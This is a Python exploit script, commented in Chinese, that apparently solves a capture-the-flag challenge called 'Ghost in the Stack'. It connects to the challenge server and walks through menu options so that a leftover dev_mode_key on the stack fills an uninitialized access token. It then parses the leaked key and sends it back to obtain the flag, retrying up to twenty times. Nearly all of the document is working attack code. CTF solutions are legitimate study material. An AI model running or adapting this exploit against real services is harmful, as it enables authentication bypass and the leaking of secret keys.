#!/usr/bin/env python3
import socket
import time
import re

def precise_stack_pollution():
    """基于精确栈布局分析的栈污染攻击"""
    host = "ghost-in-the-stack.chall.edgesecurity.team"
    port = 1344
    
    print("[+] 精确栈污染攻击")
    print("[+] 基于IDA分析的栈布局:")
    print("    verify_subscription:   [rbp-0x4] = license_key (dev_mode_key)")
    print("    check_premium_access:  [rbp-0x4] = access_token (未初始化)")
    print("[+] 攻击策略: 让两个函数使用相同的栈位置")
    print("-" * 60)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(8)
        s.connect((host, port))
        print("[+] 连接成功")
        
        # 接收初始菜单
        menu = s.recv(2048).decode(errors='ignore')
        print("[+] 收到菜单")
        
        print("\n[步骤1] 调用verify_subscription来污染栈位置[rbp-0x4]")
        
        # 选择选项1 (View free content)
        s.send(b"1\n")
        time.sleep(0.1)
        
        # 接收subscription key提示
        prompt = s.recv(1024).decode(errors='ignore')
        print(f"[DEBUG] 提示: {prompt[:50]}...")
        
        # 发送任意错误的密钥来触发get_dev_mode_key()调用
        # 重要: 这会在[rbp-0x4]位置存储真实的dev_mode_key
        s.send(b"123456\n")
        time.sleep(0.1)
        
        # 接收响应 (应该不会显示"Developer mode activated")
        response1 = s.recv(1024).decode(errors='ignore')
        print(f"[DEBUG] verify_subscription响应: 无developer mode (预期)")
        
        print("\n[步骤2] 立即调用check_premium_access读取栈残留")
        
        # 选择选项2 (Access premium content)  
        s.send(b"2\n")
        time.sleep(0.1)
        
        # 接收premium access level提示
        prompt2 = s.recv(1024).decode(errors='ignore')
        print(f"[DEBUG] Premium提示: {prompt2[:50]}...")
        
        # 发送access level (这个值不重要)
        s.send(b"1\n") 
        time.sleep(0.1)
        
        # 接收access token提示
        token_prompt = s.recv(1024).decode(errors='ignore')
        print(f"[DEBUG] Token提示: {token_prompt[:50]}...")
        
        # 关键步骤: 发送空行，让access_token保持未初始化
        # 此时access_token应该等于栈残留的dev_mode_key值
        s.send(b"\n")
        time.sleep(0.2)
        
        # 接收响应
        final_response = s.recv(2048).decode(errors='ignore')
        print(f"\n[响应] {final_response}")
        
        # 检查是否成功泄露dev_mode_key
        if "Developer Mode Key:" in final_response:
            print(f"\n{'='*60}")
            print("[SUCCESS] 栈污染攻击成功!")
            print(f"[泄露的密钥] {final_response.strip()}")
            print(f"{'='*60}")
            
            # 提取dev_key值
            key_match = re.search(r"Developer Mode Key: (0x[0-9A-Fa-f]+)", final_response)
            if key_match:
                dev_key_hex = key_match.group(1)
                dev_key_int = int(dev_key_hex, 16)
                
                print(f"[提取] 十六进制: {dev_key_hex}")
                print(f"[提取] 十进制: {dev_key_int}")
                
                # 在同一个会话中立即使用泄露的密钥获取flag！
                print(f"\n[+] 在同一会话中使用泄露的密钥获取flag")
                
                # 选择选项1 (View free content)
                s.send(b"1\n")
                time.sleep(0.1)
                
                # 接收subscription key提示
                sub_prompt = s.recv(1024).decode(errors='ignore')
                print(f"[DEBUG] Subscription提示: {sub_prompt[:50]}...")
                
                # 发送正确的dev_key
                s.send(f"{dev_key_int}\n".encode())
                time.sleep(0.3)
                
                # 接收flag响应
                flag_response = s.recv(4096).decode(errors='ignore')
                
                print(f"\n{'='*60}")
                print("[FLAG 响应]")
                print(flag_response)
                print(f"{'='*60}")
                
                s.close()
                
                # 检查是否成功获取flag
                if "Developer mode activated!" in flag_response:
                    print("[SUCCESS] 成功获取flag!")
                    return True
                else:
                    print("[WARNING] 未看到预期的成功消息")
                    return False
        else:
            print("[失败] 这次栈污染没有成功")
            print(f"[响应] {final_response}")
        
        s.close()
        return False
        
    except Exception as e:
        print(f"[ERROR] 攻击失败: {e}")
        return False

def multiple_attempts():
    """多次尝试栈污染攻击"""
    print("[+] 多次尝试栈污染攻击")
    print("[+] 理论: 不同的连接可能有不同的栈状态")
    
    max_attempts = 20
    
    for attempt in range(max_attempts):
        print(f"\n{'='*20} 尝试 {attempt + 1}/{max_attempts} {'='*20}")
        
        if precise_stack_pollution():
            print(f"[FINAL SUCCESS] 在第 {attempt + 1} 次尝试中成功!")
            return True
        
        # 短暂延迟
        time.sleep(1)
    
    print(f"[FINAL FAILURE] {max_attempts} 次尝试都失败了")
    return False

def main():
    print("=" * 70)
    print("Ghost in the Stack - 精确栈污染攻击")
    print("=" * 70)
    print("[分析] 基于IDA反汇编的栈布局分析")
    print("[发现] verify_subscription和check_premium_access使用相同栈位置")
    print("[攻击] 利用栈残留数据绕过随机密钥验证")
    print("=" * 70)
    
    try:
        # 多次尝试增加成功率
        success = multiple_attempts()
        
        if success:
            print("\n[COMPLETE] 栈污染攻击成功完成!")
        else:
            print("\n[COMPLETE] 栈污染攻击失败")
            
        return success
        
    except KeyboardInterrupt:
        print("\n[*] 用户中断攻击")
        return False

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"[FATAL ERROR] {e}")